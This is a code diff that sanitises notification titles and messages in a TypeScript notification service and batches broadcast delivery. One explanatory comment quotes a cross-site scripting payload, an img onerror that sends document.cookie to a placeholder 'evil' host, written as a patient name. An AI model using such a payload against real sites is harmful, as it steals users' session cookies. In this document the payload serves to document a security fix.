@@ -2,6 +2,7 @@ import { prisma } from "../lib/prisma";
 import { notifyUser } from "./realtime.service";
 import { MailerService } from "./mailer.service";
 import { PushService } from "./push.service";
+import { sanitize } from "../utils/sanitize";
 
 
 
@@ -86,27 +87,52 @@ export class NotificationService {
             return null;
         }
 
+        // `title` and `message` are sanitised at this single choke point, which
+        // every notification passes through, rather than at each of the 19 call
+        // sites.
+        //
+        // The concrete attack this closes: `User.name` is free text with no
+        // character restriction, so a patient can register as
+        // `<img src=x onerror="fetch('//evil/'+document.cookie)">`. That name
+        // reaches `support.controller`'s SOS alert text and
+        // `message.service`'s "New message from ..." body, which were both
+        // interpolated verbatim - and then rendered into a clinician's
+        // authenticated session, in-app and over the realtime WebSocket.
+        //
+        // Every other free-text field in the codebase already went through
+        // `sanitize()` - messages, reviews, care-plan text, appointment notes -
+        // which is what makes this an oversight rather than a design choice.
+        const title = sanitize(data.title);
+        const message = sanitize(data.message);
+
         const notification = await prisma.notification.create({
             data: {
                 userId: data.userId,
-                title: data.title,
-                message: data.message,
+                title,
+                message,
                 type,
             },
         });
 
         // Live push via the Go realtime service (fire-and-forget)
-        await notifyUser(data.userId, data.title, data.message, type);
+        await notifyUser(data.userId, title, message, type);
 
         // Web push (when the user has subscribed a device)
-        await PushService.send(data.userId, data.title, data.message, "/dashboard");
+        await PushService.send(data.userId, title, message, "/dashboard");
 
         return notification;
     }
 
     // Admin broadcast: one batched insert, then realtime + web push per user.
     // Emails are intentionally NOT sent (a broadcast must never mass-email).
-    static async broadcast(title: string, message: string, type = "system") {
+    static async broadcast(rawTitle: string, rawMessage: string, type = "system") {
+        // Same reasoning as `create`: the admin who types this is trusted, but a
+        // broadcast is delivered to every user on the platform and is rendered
+        // into each of their sessions, so it is sanitised once here rather than
+        // trusted at the boundary.
+        const title = sanitize(rawTitle);
+        const message = sanitize(rawMessage);
+
         const users = await prisma.user.findMany({
             where: { isBanned: false },
             select: { id: true, notificationPrefs: true },
@@ -122,12 +148,23 @@ export class NotificationService {
             data: recipients.map((u) => ({ userId: u.id, title, message, type })),
         });
 
-        await Promise.allSettled(
-            recipients.flatMap((u) => [
-                notifyUser(u.id, title, message, type),
-                PushService.send(u.id, title, message, "/dashboard"),
-            ])
-        );
+        // Two problems with the original fan-out, both about scale rather than
+        // correctness. `PushService.send` issues its own `pushSubscription`
+        // query per recipient, so a broadcast to 10k users is 10k queries plus
+        // up to 20k outbound HTTPS calls materialised as live promises in one
+        // request. And it is all awaited inline, so a broadcast is a request
+        // that takes minutes and times out halfway. Chunked, so the pool is not
+        // exhausted and a slow provider cannot starve the rest.
+        const CHUNK = 25;
+        for (let i = 0; i < recipients.length; i += CHUNK) {
+            const chunk = recipients.slice(i, i + CHUNK);
+            await Promise.allSettled(
+                chunk.flatMap((u) => [
+                    notifyUser(u.id, title, message, type),
+                    PushService.send(u.id, title, message, "/dashboard"),
+                ])
+            );
+        }
 
         return { recipients: recipients.length };
     }
